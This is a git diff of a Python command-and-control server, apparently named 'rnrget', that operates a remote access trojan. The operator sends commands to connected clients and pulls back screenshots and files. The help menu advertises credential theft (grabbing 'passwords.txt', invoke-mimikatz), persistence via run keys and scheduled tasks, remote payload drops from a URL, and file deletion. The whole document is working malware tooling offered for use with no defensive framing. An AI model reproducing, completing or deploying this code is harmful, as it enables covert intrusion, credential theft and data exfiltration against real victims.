@@ -1,114 +1,90 @@
-QW4HD DQCRG HM64M 6GJRK 8K83T
-
-### server
-#!/usr/bin/env python
+#!/usr/bin/python3
 
 import socket
 import os
 import datetime
+import sys
 
-global host
-global port
-global s
-host = '10.0.0.1'
-port = 9999
-s = socket.socket()
-def create():
-    try:
-        global s
-        s = socket.socket()
-    except socket.error as msg:
-        print("Error: " + str(msg))
+def download_file(file_path, client_socket):
+	try:
+		data = b''
+		while True:
+			p = client_socket.recv(4096)
+			data += p
+			if len(p) < 4096:
+				break
+		f = open(file_path,'wb')
+		f.write(data)
+		f.close()
+		return True
+	except:
+		return False
 
+def get_reply(client_socket):
+	data = b''
+	while True:
+		p = client_socket.recv(4096)
+		data += p
+		if len(p) < 4096:
+			break
+	return((data).decode('utf-8'))
 
-def bind():
-    try:
-        print("Listening on port " + str(port))
-        s.bind((host, port))
-        s.listen(5)
-    except socket.error as msg:
-        print("Error: " + str(msg))
-        bind()
+def parse_cmd(server_socket):
+	client_socket, address = server_socket.accept()
+	print("[+] new rnrclient: " + str(address))
+	while True:	
+		try:
+			cmd = input("$rnrget> ")
+			args = cmd.split()
+			print(str(args))
+			if(cmd == 'quit' or cmd == 'q' or cmd == 'exit'):
+				client_socket.send("exit".encode())
+				client_socket.close()
+				address.close()
+				sys.exit()
+				break
+			elif(cmd == '?' or cmd == '/?' or cmd == 'help' or cmd == '-h'):
+				menu()
+			elif(cmd == 'clear' or cmd == 'cls'):
+				os.system('clear')
+			elif(cmd == 'screencap'):
+				client_socket.send(cmd.encode())
+				dt = str(datetime.datetime.now())
+				filename = dt + '.jpg'
+				if download_file(filename, client_socket) == True:
+					print("[+] Operation Complete: screencap has been saved in handler directory as " + filename)
+				else:
+					print('[-] Failed to Download Screencap!')
+			elif(args[0] == "getfile"):
+				client_socket.send((args[0] + ' ' + args[1]).encode())
+				if (download_file(args[2], client_socket)) == True:
+					print("[+] Operation Complete: " + args[2] + " has been saved in handler directory")
+				else:
+					print('[-] Failed to Download ' + args[1])
+			elif(args[0] == "arch"):
+				if len(args) < 3:
+					print("[+] arch requires source and destination path")
+				else:
+					client_socket.send(cmd.encode())
+					print(get_reply(client_socket))
+			else:
+				client_socket.send(cmd.encode())
+				print(get_reply(client_socket))
+		except:
+			print('[-] Command Failed!')
 
-
-def accept():
-    conn, address = s.accept()
-    print("New client connection established: IP " + address[0] + " Port: " + str(address[1]))
-    ssend(conn)
-    conn.close()
-
-def ssend(conn):
-    while True:
-        cmd = raw_input("rnrget> ")
-        args = cmd.split()
-        if len(cmd) < 1:
-            continue
-        elif cmd == 'quit' or cmd == 'exit':
-            conn.send('goodbye!')
-            conn.close()
-            s.close()
-            sys.exit()
-        elif cmd == 'clear' or cmd == 'cls':
-            os.system('clear')
-        elif cmd == '?' or cmd == '/?' or cmd == 'help' or cmd == '-h':
-            menu()
-        elif(cmd == 'screencap'):
-            conn.send(cmd.encode())
-            data = b''
-            while True:
-                p = conn.recv(4096)
-                data += p
-                if len(p) < 4096:
-                    break
-            dt = str(datetime.datetime.now())
-            filename = dt + '.jpg'
-            f = open(filename,'wb')
-            f.write(data)
-            f.close()
-            print("Operation Complete: screencap has been saved in handler directory as " + filename)
-        elif(args[0] == 'getfile'):
-            conn.send(cmd.encode())
-            data = b''
-            while True:
-                p = conn.recv(4096)
-                data += p
-                if len(p) < 4096:
-                    break
-            filename = args[2]
-            f = open(filename, 'wb')
-            f.write(data)
-            f.close()
-            print("Operation Complete: file has been saved as " + filename)
-        elif(args[0] == 'drop'):
-             conn.send('drop ' + str(os.path.getsize(args[1])))
-             resp = conn.recv(1024)
-             if resp[:5].decode("utf-8") == 'ready':
-                f = open(args[1],'r')
-                data = f.read(1024)
-                while (data):
-                    conn.send(data)
-                    data = f.read(1024)
-                f.close()
-                print('\nPAYLOAD SENT.')
-        else:
-           conn.send(str.encode(cmd))
-           data = b''
-           while True:
-                client_response = str(conn.recv(4096))
-                data += client_response
-                if len(client_response) < 4096:
-                    break
-           print(data)
 def main():
-        art()
-        menu()
-        create()
-        bind()
-        accept()
-
+	server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	#server_socket.bind(("10.0.0.1", 9999))
+	server_socket.bind(("172.16.80.129",9999))
+	server_socket.listen(5)
+	art()
+	menu()
+	print("\n[+] Listening for rnrclients on port 9999....")
+	parse_cmd(server_socket)
 
 def menu():
-        print("command      description                 example");
+        print("Command      Description                 Format");
         print("-------      -----------                 ------");
         print("help         display help menu           help, /?, ?");
         print("arch         create zip file from dir    arch <source path> <destination path>, arch C:\\Users\\srcdir C:\\Users\\dest.zip");
@@ -117,7 +93,7 @@ def menu():
         print("deldir       delete directory            deldir <target path>, deldir C:\\Users\\Admin\\Directory");
         print("drop         drop payloads               drop <path> <URI>, dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld https://raw.githubusercontent.com/rnranalysis/file.dld");
         print("envar        get environmental vars      envar");
-        print("list         enumerate files             enumdir <target dir>, enumdir C:\\Users\\Admin\\Desktop");
+        print("listdir      enumerate files             enumdir <target dir>, enumdir C:\\Users\\Admin\\Desktop");
         print("getfile      grab files                  getfile <target path> <local download path>, getfile C:\\Users\\Admin\\passwords.txt /usr/root/Desktop/passwords.txt");
         print("grep         case sensisitive grep       grep <pattern> <path>, grep foo bar.txt");
         print("hostinfo     get host information        hostinfo");
@@ -125,7 +101,7 @@ def menu():
         print("mimi         invoke-mimikatz             mimi");
         print("mv           move files                  mv <source> <destination>, mv C:\\Users\\Admin\\source.file C:\\Users\\Admin\\Desktop\\dest.file");
         print("mkdir        create directory            mkdir <target dir>, mkdir C:\\Users\\Admin\\NewDir");
-        print("persist      pick yo persistence         persist logonscript or startup or schtask");
+        print("persist      add run key         		persist logonscript or startup or schtask");
         print("ps           get process listing         ps");
         print("pwd          print working directory     pwd");
         print("cat          read text from file         cat <target path>, cat C:\\Users\\Admin\\helloworld.txt");
@@ -153,3 +129,5 @@ def art():
     print("                               $$$$$$/                      ");
 
 main()
+
+
